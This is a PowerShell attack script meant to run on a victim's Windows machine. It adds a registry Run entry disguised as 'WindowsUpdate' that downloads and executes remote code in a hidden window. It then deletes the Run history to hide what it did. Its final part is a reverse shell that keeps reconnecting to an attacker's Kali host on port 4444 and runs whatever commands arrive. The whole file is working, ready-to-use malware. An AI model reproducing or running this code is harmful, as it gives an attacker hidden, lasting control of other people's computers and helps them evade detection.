# --- 1. PERSISTENCE (Adds to Registry) ---
$Path = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$Name = "WindowsUpdate"
$Value = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command IEX(New-Object Net.WebClient).DownloadString('YOUR_SHORT_URL')"
if (!(Get-ItemProperty -Path $Path -Name $Name -ErrorAction SilentlyContinue)) {
    Set-ItemProperty -Path $Path -Name $Name -Value $Value
}

# --- 2. CLEANUP (Deletes Run History) ---
$HistoryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
Remove-ItemProperty -Path $HistoryPath -Name "*" -ErrorAction SilentlyContinue

# --- 3. THE BEACON LOOP (Tries to find Kali) ---
while($true) {
    try {
        $client = New-Object System.Net.Sockets.TCPClient("192.168.43.109", 4444)
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $writer.AutoFlush = $true
        
        # This only goes to YOUR terminal, not the victim's screen
        $writer.WriteLine("--- TARGET CONNECTED ---")
        
        $reader = New-Object System.IO.StreamReader($stream)
        while($client.Connected) {
            $writer.Write("PS " + (Get-Location).Path + "> ")
            $line = $reader.ReadLine()
            if($line -eq "exit") { break }
            $out = (Invoke-Expression $line 2>&1 | Out-String)
            $writer.WriteLine($out)
        }
        $client.Close()
    }
    catch {
        Start-Sleep -Seconds 10 # Wait 10 seconds before trying again
    }
}
